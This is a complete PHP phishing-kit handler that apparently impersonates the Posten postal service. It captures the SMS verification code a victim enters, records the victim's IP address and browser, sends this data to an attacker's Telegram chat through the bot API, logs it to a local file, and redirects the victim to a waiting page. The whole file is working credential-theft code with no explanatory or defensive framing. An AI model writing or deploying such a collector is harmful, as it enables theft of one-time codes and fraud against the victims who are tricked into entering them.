<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ Posten SMS]-----++--\n";
$message .= "SMS : ".$_POST['sms']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "--------------------------------------------\n";
$subject = "Posten SMS [ " . $zabi . " ]  ";

$token = "bot<TOKEN_REMOVED>";
$data = [
    'text' => $message,
    'chat_id' => '-1001200889598'
];

file_get_contents("https://api.telegram.org/bot<TOKEN_REMOVED>/sendMessage?" . http_build_query($data) );

    $text = fopen('../../sms-1950.txt', 'a');
fwrite($text, $message);



header("Location: ../wait2/");         
?>